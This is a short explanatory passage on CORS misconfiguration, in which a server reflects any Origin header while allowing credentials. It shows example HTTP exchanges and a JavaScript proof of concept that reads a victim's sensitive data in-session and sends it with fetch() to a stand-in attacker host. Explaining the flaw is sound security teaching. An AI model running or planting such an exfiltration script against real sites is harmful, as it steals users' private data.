Some applications need to provide access to a number of other domains. Since maintaining a list of allowed domains requires an ongoing effort, many take the easy route which adds more risk in creating mistakes that introduces a vulnerability.

One way developers do this is by reading the `Origin` HTTP header from requests and includes a response header stating that the requesting origin is allowed. So if an attacker adds an `Origin` header to a request or modifies its value like the following:
```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://attacker-owned-website.com
Cookie: sessionid=...
```
The server will then send a response like the following:
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker-owned-website.com
Access-Control-Allow-Credentials: true
...
```
These headers state that access is allowed from the requesting domain (`attacker-owned-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.

Because the application accepts arbitrary origins, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information, an attacker can retrieve these information by placing a script like the following on their website:
```js
var xhr = new XMLHttpRequest();
var url = "https://vulnerable-website.com"

xhr.onreadystatechange = function () {
	if (xhr.readyState == XMLHttpRequest.DONE) {
		fetch("https://attacker-owned-website.com/log?key=" + xhr.responseText)
	}
}
xhr.open("GET", url + "/sensitiveData", true);
xhr.withCredentials = true;
xhr.send(null)
```